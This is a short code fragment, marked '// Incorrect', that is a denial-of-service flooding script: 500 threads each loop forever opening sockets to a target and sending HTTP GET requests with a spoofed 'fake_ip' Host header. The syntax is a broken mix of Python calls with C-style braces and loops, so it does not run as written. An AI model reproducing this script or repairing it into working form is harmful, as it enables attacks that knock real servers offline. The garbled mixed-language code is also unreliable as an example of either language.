// Incorrect
function attack() {
    while (true) {
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((target, port))
        s.sendto(("GET /" + target + "HTTP/1.1\r\n").encode("ascii"), (target, port))
        s.sendto(("Host: " + fake_ip + "\r\n\r\n").encode("ascii"), (target,port))
        s.close()

        global already_connected
        already_connected += 1
        if already_connected % 500 == 0 {
            print(already_connected)
        }
    }
}

for (i = 0; i < 500; i++) {
    thread = threading.Thread(target=attack)
    thread.start()
}